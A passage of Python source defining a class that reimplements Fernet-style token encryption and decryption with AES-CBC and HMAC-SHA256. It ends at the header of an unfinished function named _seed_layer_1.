class FernetCompatible:
    def __init__(self, key):
        if isinstance(key, str):
            key = key.encode()
        self.key = base64.urlsafe_b64decode(key)
        if len(self.key) != 32:
            raise ValueError("Key must be 32 bytes.")
        self.signing_key = self.key[:16]
        self.encryption_key = self.key[16:]

    @staticmethod
    def _get_timestamp():
        return int(time.time()).to_bytes(8, 'big')

    def encrypt(self, data):
        if isinstance(data, str):
            data = data.encode()
        current_time = self._get_timestamp()
        iv = get_random_bytes(16)
        cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(pad(data, AES.block_size))
        payload = b'\x80' + current_time + iv + ciphertext
        h = HMAC.new(self.signing_key, digestmod=SHA256)
        h.update(payload)
        signature = h.digest()
        return base64.urlsafe_b64encode(payload + signature).decode()

    def decrypt(self, token):
        if isinstance(token, str):
            token = token.encode()
        try:
            raw = base64.urlsafe_b64decode(token)
            payload = raw[:-32]
            signature = raw[-32:]
            h = HMAC.new(self.signing_key, digestmod=SHA256)
            h.update(payload)
            if not hmac.compare_digest(signature, h.digest()):
                return None
            if payload[0] != 0x80:
                return None
            iv = payload[9:25]
            ciphertext = payload[25:]
            cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
            plain = unpad(cipher.decrypt(ciphertext), AES.block_size)
            return plain.decode() 
        except:
            return None

def _seed_layer_1():
